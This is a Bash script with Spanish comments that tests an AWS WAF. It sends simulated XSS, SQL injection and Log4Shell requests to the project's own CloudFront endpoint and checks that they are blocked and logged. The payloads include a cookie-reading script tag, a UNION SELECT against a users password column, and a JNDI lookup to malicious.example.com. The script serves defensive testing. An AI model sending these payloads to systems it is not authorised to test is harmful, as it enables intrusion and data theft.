#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# Prueba de seguridad del WAF — envía peticiones de ataque simuladas contra
# el propio CloudFront de BigRoyal para demostrar que el Web Application
# Firewall las bloquea y las registra en el dashboard de seguridad.
#
# USO (desde infra/):
#   bash scripts/test-waf-ataques.sh
#   bash scripts/test-waf-ataques.sh https://d136owkbyog7vh.cloudfront.net
#
# Luego, en CloudWatch → Dashboards → bigroyal-dev-3-seguridad:
#   - "Ataques bloqueados por regla del WAF" muestra los bloqueos agrupados por regla
#   - "Bloqueos del WAF (desde logs)" cuenta el total (ajustar el rango de tiempo a 1h)
# Los logs del WAF tardan 1-3 minutos en propagar; refrescar el dashboard.
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

# URL de CloudFront: primer argumento, o se lee del output de Terraform
if [ "${1:-}" != "" ]; then
  CF_URL="$1"
else
  CF_URL="$(terraform -chdir=terraform/envs/dev output -raw cloudfront_url)"
fi

echo "Objetivo (tu propio CloudFront): $CF_URL"
echo "Enviando peticiones de ataque simuladas..."
echo

# Cache-busting: cada petición lleva un parámetro único para no golpear la caché
NONCE="$(date +%s)"

# ── Ataque 1: Cross-Site Scripting (XSS) — lo bloquea CommonRuleSet ──────────
echo "[1] XSS en query string"
for i in 1 2 3; do
  curl -s -o /dev/null -w "    intento $i -> HTTP %{http_code}\n" -G "$CF_URL/" \
    --data-urlencode "b=${NONCE}${i}" \
    --data-urlencode 'q=<script>alert(document.cookie)</script>'
done

# ── Ataque 2: SQL Injection — lo bloquea CommonRuleSet ──────────────────────
echo "[2] Inyeccion SQL en query string"
for i in 1 2; do
  curl -s -o /dev/null -w "    intento $i -> HTTP %{http_code}\n" -G "$CF_URL/" \
    --data-urlencode "b=${NONCE}${i}" \
    --data-urlencode "id=1' OR '1'='1' UNION SELECT password FROM users--"
done

# ── Ataque 3: Log4Shell (Log4j RCE) — lo bloquea KnownBadInputsRuleSet ───────
echo "[3] Log4Shell (Log4j) en header User-Agent"
for i in 1 2; do
  curl -s -o /dev/null -w "    intento $i -> HTTP %{http_code}\n" "$CF_URL/?b=${NONCE}${i}" \
    -H 'User-Agent: ${jndi:ldap://malicious.example.com/exploit}'
done

# ── Control: una peticion legitima (debe pasar con 200) ──────────────────────
echo "[control] Peticion legitima (debe pasar)"
curl -s -o /dev/null -w "    normal    -> HTTP %{http_code}\n" "$CF_URL/?b=${NONCE}ok"

echo
echo "Listo. Los ataques quedan registrados por el WAF aunque curl vea HTTP 200:"
echo "el WAF de CloudFront es global y a veces sirve desde cache de borde, pero"
echo "el bloqueo SIEMPRE se registra en sus logs (esa es la fuente del dashboard)."
echo
echo "Espera 1-3 min y refresca el dashboard bigroyal-dev-3-seguridad:"
echo "  - 'Ataques bloqueados por regla del WAF' -> agrupa por regla que bloqueo"
echo "  - 'Bloqueos del WAF (desde logs)'        -> total (pon el rango de tiempo en 1h)"
